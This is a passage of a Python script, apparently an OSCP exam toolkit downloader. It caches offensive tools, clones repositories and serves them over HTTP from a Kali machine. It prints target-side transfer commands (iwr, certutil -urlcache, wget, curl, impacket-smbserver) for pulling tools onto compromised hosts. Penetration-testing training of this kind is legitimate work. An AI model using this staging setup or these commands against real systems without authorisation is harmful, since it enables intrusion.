    all_urls = [primary] + fallbacks

    for i, url in enumerate(all_urls):
        if i > 0:
            info(f"  Trying fallback {i}: {url.split('/')[-1]}")
        if download_file(url, dest):
            return True
        # Remove empty/partial file on failure
        if dest.exists() and dest.stat().st_size == 0:
            dest.unlink()
    return False

def extract_archive(filepath, dest_dir):
    name = filepath.name
    try:
        if name.endswith(".tar.gz") or name.endswith(".tgz"):
            with tarfile.open(filepath, "r:gz") as tar:
                tar.extractall(path=dest_dir)
            ok(f"  Extracted tar.gz → {dest_dir}")
        elif name.endswith(".zip"):
            with zipfile.ZipFile(filepath, "r") as z:
                z.extractall(path=dest_dir)
            ok(f"  Extracted zip → {dest_dir}")
        elif name.endswith(".gz") and not name.endswith(".tar.gz"):
            out_name = name[:-3]
            out_path = dest_dir / out_name
            with gzip.open(filepath, "rb") as gz:
                with open(out_path, "wb") as f:
                    shutil.copyfileobj(gz, f)
            os.chmod(out_path, 0o755)
            ok(f"  Extracted gz → {out_path.name}")
    except Exception as e:
        err(f"  Extract failed: {e}")

def clone_or_pull(url, dest):
    if dest.exists() and (dest / ".git").exists():
        skip(f"Cached: {dest.name} (git pull)")
        subprocess.run(["git", "-C", str(dest), "pull", "-q"], capture_output=True)
        return
    try:
        subprocess.run(
            ["git", "clone", "--depth=1", "-q", url, str(dest)],
            capture_output=True, timeout=120
        )
        ok(f"Cloned: {dest.name}")
    except Exception as e:
        err(f"Clone failed: {dest.name} → {e}")


# ── Main Logic ──────────────────────────────────────────────────

def download_category(category, tools_list, base_dir):
    cat_dir = base_dir / category
    cat_dir.mkdir(parents=True, exist_ok=True)

    total = len(tools_list)
    cached = 0
    downloaded = 0
    failed = 0

    for t in tools_list:
        name = t["name"]
        dest = cat_dir / name
        should_extract = t.get("extract", False)

        if t.get("local"):
            skip(f"Local (copy step handles): {name}")
            cached += 1
            continue

        url = t["url"]

        if should_extract:
            extract_marker = cat_dir / f".{name}.extracted"
            if extract_marker.exists() and file_ok(dest):
                skip(f"Cached: {name}")
                cached += 1
                continue
        elif file_ok(dest):
            skip(f"Cached: {name}")
            cached += 1
            continue

        info(f"Downloading: {name}")
        if try_download_with_fallbacks(t, dest):
            downloaded += 1
            if should_extract:
                extract_archive(dest, cat_dir)
                extract_marker.touch()
            if name.endswith((".sh", ".py", ".pl")) or not "." in name.rsplit("/",1)[-1]:
                os.chmod(dest, 0o755)
            # Print fallback note if tool has one
            if t.get("note"):
                warn(f"  NOTE: {t['note']}")
        else:
            failed += 1
            if t.get("note"):
                warn(f"  NOTE: {t['note']}")

    return total, cached, downloaded, failed


def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║  ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗   ║
║  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝   ║
║     ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║      ║
║     ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║      ║
║     ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║      ║
║     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝      ║
║  OSCP+ Unified Toolkit Downloader — All Tools, One Script   ║
╚══════════════════════════════════════════════════════════════╝{NC}
{DIM}  Cache: {CACHE_DIR}{NC}
""")


def list_tools():
    banner()
    grand = 0
    for cat in ["windows", "scripts", "linux", "repos"]:
        items = TOOLS[cat]
        print(f"\n{C}═══ {cat.upper()} ({len(items)} items) ═══{NC}")
        for t in items:
            name = t["name"]
            dest = CACHE_DIR / cat / name
            status = f"{G}CACHED{NC}" if file_ok(dest) or (dest.exists() and (dest / ".git").exists()) else f"{DIM}missing{NC}"
            cat_label = t.get("cat", "")
            print(f"  {status}  {B}{name:40s}{NC} {DIM}[{cat_label}]{NC}")
            grand += 1
    print(f"\n{B}Total: {grand} tools{NC}\n")


def copy_local_files(base_dir):
    """Copy local scripts/files bundled alongside this script into the toolkit."""
    script_dir = Path(__file__).resolve().parent
    copied = 0
    for cat, tools in TOOLS.items():
        for t in tools:
            if not t.get("local"):
                continue
            name = t["name"]
            src = script_dir / name
            if not src.exists():
                warn(f"Local file not found: {src} — skipping")
                continue
            dest_dir = base_dir / cat
            dest_dir.mkdir(parents=True, exist_ok=True)
            dest = dest_dir / name
            try:
                shutil.copy2(src, dest)
                ok(f"Local copy: {name} → {dest}")
                copied += 1
            except Exception as e:
                warn(f"Failed to copy {name}: {e}")
    return copied


def build_html(base_dir):
    """Copy all local HTML assets from the script's directory into the toolkit root."""
    script_dir = Path(__file__).resolve().parent
    # All .html files next to this script are served at the toolkit root
    html_files = list(script_dir.glob("*.html"))
    if not html_files:
        warn("No .html files found next to ToolKitDownloader.py — skipping HTML build")
        return False

    copied = 0
    for src in html_files:
        dst = base_dir / src.name
        try:
            shutil.copy2(src, dst)
            ok(f"{src.name} → {dst}")
            copied += 1
        except Exception as e:
            warn(f"Failed to copy {src.name}: {e}")

    return copied > 0


def serve_toolkit(base_dir, ip):
    port = 0
    with socketserver.TCPServer(("0.0.0.0", 0), None) as tmp:
        port = tmp.server_address[1]

    os.chdir(base_dir)
    handler = http.server.SimpleHTTPRequestHandler

    class QuietHandler(handler):
        def log_message(self, fmt, *args):
            info(f"GET {args[0]}")

    server = socketserver.TCPServer(("0.0.0.0", port), QuietHandler)

    html_line = ""
    html_files = sorted(base_dir.glob("*.html"))
    if html_files:
        links = "  ".join(f"http://{ip}:{port}/{h.name}" for h in html_files)
        html_line = f"\n{M}  PAGES: {links}{NC}"

    print(f"""
{G}╔══════════════════════════════════════════════════════════════╗
║  TOOLKIT SERVER RUNNING                                      ║
╠══════════════════════════════════════════════════════════════╣{NC}
{B}  URL:  http://{ip}:{port}/{NC}{html_line}
{B}  Dir:  {base_dir}{NC}
{G}╠══════════════════════════════════════════════════════════════╣
║  TARGET DOWNLOAD COMMANDS                                    ║
╠══════════════════════════════════════════════════════════════╣{NC}

{Y}  [PowerShell]{NC}
  iwr -uri http://{ip}:{port}/windows/FILE -Outfile FILE

{Y}  [CMD]{NC}
  certutil -urlcache -split -f http://{ip}:{port}/windows/FILE FILE

{Y}  [Linux]{NC}
  wget http://{ip}:{port}/linux/FILE -O FILE
  curl http://{ip}:{port}/linux/FILE -o FILE

{Y}  [SMB Server (separate terminal)]{NC}
  impacket-smbserver share {base_dir} -smb2support

{G}╚══════════════════════════════════════════════════════════════╝{NC}
{DIM}  Press Ctrl+C to stop{NC}
""")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Y}  Server stopped.{NC}")
        server.shutdown()


def _update_cache_dir(new_dir):
    global CACHE_DIR
    CACHE_DIR = new_dir

def main():
    parser = argparse.ArgumentParser(description="OSCP+ Unified Toolkit Downloader")
    parser.add_argument("--download-only", action="store_true", help="Download only, no server")
    parser.add_argument("--serve-only", action="store_true", help="Serve existing cache")
    parser.add_argument("--list", action="store_true", help="List all tools and cache status")
    parser.add_argument("--category", choices=["windows", "scripts", "linux", "repos", "all"], default="all", help="Download specific category")
    parser.add_argument("--cache-dir", type=str, default=str(CACHE_DIR), help="Cache directory path")
    parser.add_argument("--ip", type=str, default=None, help="IP address to use for download commands (skips interactive selection)")
    args = parser.parse_args()

    cache_dir = Path(args.cache_dir)
    _update_cache_dir(cache_dir)
    ip = pick_ip(args.ip)

    if args.list:
        list_tools()
        return

    if args.serve_only:
        banner()
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        copy_local_files(CACHE_DIR)
        build_html(CACHE_DIR)
        serve_toolkit(CACHE_DIR, ip)
        return

    banner()
    info(f"Kali IP: {ip}")
    info(f"Cache: {CACHE_DIR}")
    print()

    CACHE_DIR.mkdir(parents=True, exist_ok=True)

    categories = ["windows", "scripts", "linux"] if args.category == "all" else [args.category]
    if args.category == "all":
        categories.append("repos")

    grand_total = 0
    grand_cached = 0
    grand_downloaded = 0
    grand_failed = 0

    for cat in categories:
        if cat == "repos":
            print(f"\n{C}═══ GIT REPOSITORIES ═══{NC}")
            repo_dir = CACHE_DIR / "repos"
            repo_dir.mkdir(parents=True, exist_ok=True)
            for repo in TOOLS["repos"]:
                clone_or_pull(repo["url"], repo_dir / repo["name"])
                grand_total += 1
            # Post-clone: copy key files from repos into served category dirs
            print(f"\n{C}═══ POST-REPO COPIES ═══{NC}")
            for repo_name, rel_path, dest_cat, dest_name in POST_REPO_COPIES:
                src = repo_dir / repo_name / Path(rel_path)
                dest_dir = CACHE_DIR / dest_cat
                dest_dir.mkdir(parents=True, exist_ok=True)
                dest = dest_dir / dest_name
                if dest.exists() and dest.stat().st_size > 0:
                    skip(f"Cached: {dest_name} (from {repo_name})")
                    continue
                if src.exists():
                    shutil.copy2(src, dest)
                    os.chmod(dest, 0o755)
                    ok(f"Copied: {dest_name} ← repos/{repo_name}/{rel_path}")
                # else: silently skip (maybe a fallback path entry)
            continue

        print(f"\n{C}═══ {cat.upper()} ═══{NC}")
        total, cached, downloaded, failed = download_category(cat, TOOLS[cat], CACHE_DIR)
        grand_total += total
        grand_cached += cached
        grand_downloaded += downloaded
        grand_failed += failed

    # Copy local bundled files (Accesschk.ps1, etc.)
    copy_local_files(CACHE_DIR)

    # Summary
    print(f"""
{G}╔══════════════════════════════════════════════════════════════╗
║  DOWNLOAD COMPLETE                                           ║
╠══════════════════════════════════════════════════════════════╣{NC}
  {B}Total:      {grand_total}{NC}
  {G}Cached:     {grand_cached} (skipped){NC}
  {C}Downloaded: {grand_downloaded}{NC}
  {R}Failed:     {grand_failed}{NC}
  {DIM}Location:   {CACHE_DIR}{NC}
{G}╚══════════════════════════════════════════════════════════════╝{NC}
""")

    if grand_failed > 0:
        warn(f"{grand_failed} downloads failed — re-run to retry (cached files won't re-download)")

    # Copy privesc.html into toolkit root so it's served alongside tools
    info("Building HTML cheatsheet...")
    build_html(CACHE_DIR)

    if not args.download_only:
        info("Starting HTTP server...")
        serve_toolkit(CACHE_DIR, ip)


if __name__ == "__main__":
    main()
